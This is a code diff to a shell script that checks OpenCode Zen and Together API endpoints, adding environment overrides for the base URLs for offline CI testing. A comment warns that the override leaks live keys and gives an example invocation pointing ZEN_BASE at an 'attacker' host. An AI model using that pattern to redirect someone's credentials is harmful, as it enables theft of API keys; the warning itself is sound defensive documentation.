@@ -7,12 +7,41 @@
 # /messages (Anthropic-format) endpoint is not documented upstream, so the
 # script tries Authorization: Bearer AND x-api-key and reports which worked.
 #
-# Endpoints (verified as of 2026-08-20, https://opencode.ai/docs/zen):
+# DEFAULT endpoints (verified as of 2026-08-20, https://opencode.ai/docs/zen).
+# ZEN_BASE and TOGETHER_BASE override the two prefixes, so this list is what a
+# run defaults to, not a statement of where any given run went:
 #   Zen      GET  https://opencode.ai/zen/v1/models
 #   Zen      POST https://opencode.ai/zen/v1/chat/completions   (openai engine)
 #   Zen      POST https://opencode.ai/zen/v1/messages           (anthropic engine)
 #   Together GET  https://api.together.xyz/v1/models
 #   Together POST https://api.together.xyz/v1/chat/completions
+#
+# The overrides exist for exactly one caller: CI points them at
+# scripts/verify/fake-provider.py so the base install can be exercised with no
+# network. That convenience has a real price, and it is the reason this comment
+# is long: every request below carries your live key, so an overridden base
+# ships that key wherever the variable points -- `ZEN_BASE=http://attacker/
+# check-providers.sh` is a one-variable exfiltration primitive. Never export
+# either name in a shell you also use for real runs; CI sets them per
+# invocation, next to fixture keys.
+#
+# The asymmetry with the two sibling scripts is deliberate, so nobody "fixes"
+# it: pin-models.sh:83-84 (this directory) hardcodes its catalog URLs, because
+# drift is only meaningful against the real catalog; and
+# scripts/sync-models.sh:36-37 (one level up, NOT a sibling in this directory,
+# so do not go looking for it here) takes one whole URL each as ZEN_MODELS_URL /
+# TOGETHER_MODELS_URL rather than a base. Three scopes, three spellings, on
+# purpose.
+#
+# That the defaults survived being made overridable is measured, not asserted:
+# test-base-install.sh phase E puts a recording curl shim first on PATH, runs
+# this script with both names UNSET, and compares the URLs curl was handed
+# against the six literals above, in order. That is the check to reach for --
+# grepping this file for the ":-https://..." default is a tautology that cannot
+# tell a honoured default from one shadowed by an exported empty string. (The
+# shim must record only http*-shaped argv elements. Measured with a
+# record-everything shim: all of "$@" puts a key in the log SIX times -- one
+# key-bearing auth header per request, and there are six requests below.)
 set -euo pipefail
 
 # shellcheck source=scripts/verify/lib.sh
@@ -26,6 +55,12 @@ Requires OPENCODE_ZEN_API_KEY and TOGETHER_API_KEY in the environment
 (Mac: open a new terminal after keychain-secrets.sh; brain: source
 /data/secrets.env). Each test prints PASS/FAIL; exits non-zero if any fail.
 Cost: a handful of 1-token completions — fractions of a cent.
+
+Env overrides, for CI only: ZEN_BASE and TOGETHER_BASE replace the endpoint
+prefixes (default https://opencode.ai/zen/v1 and https://api.together.xyz/v1)
+so the checks can be run against scripts/verify/fake-provider.py offline.
+Setting either one sends your real key to whatever host it names — do not
+export them in a shell you use for real runs.
 EOF
 }
 
@@ -35,8 +70,13 @@ case "${1:-}" in
   *) die_usage "unknown argument: $1" ;;
 esac
 
-ZEN_BASE="https://opencode.ai/zen/v1"
-TOGETHER_BASE="https://api.together.xyz/v1"
+# `:-`, not `-`. Measured in bash: with an exported ZEN_BASE="", `${ZEN_BASE-x}`
+# keeps the empty string, which collapses "$ZEN_BASE/models" into the relative
+# "/models" and every test fails on a URL nobody typed. `:-` treats empty as
+# absent. Both spellings are shellcheck-clean under check-unassigned-uppercase,
+# so the linter will not catch a slip here.
+ZEN_BASE="${ZEN_BASE:-https://opencode.ai/zen/v1}"
+TOGETHER_BASE="${TOGETHER_BASE:-https://api.together.xyz/v1}"
 
 mask() { printf '%s' "${1:0:4}...(masked)"; }
 
@@ -76,6 +116,10 @@ body_snippet() { head -c 300 "$BODY_FILE" | tr '\n' ' '; echo; }
 echo "== check-providers =="
 echo "Zen key:      $(mask "$OPENCODE_ZEN_API_KEY")"
 echo "Together key: $(mask "$TOGETHER_API_KEY")"
+# Bases are echoed because they are no longer constants: "Zen GET /models PASS"
+# on its own stopped identifying which host answered.
+echo "Zen base:      $ZEN_BASE"
+echo "Together base: $TOGETHER_BASE"
 echo
 
 # ---- 1. Zen: GET /models ---------------------------------------------------
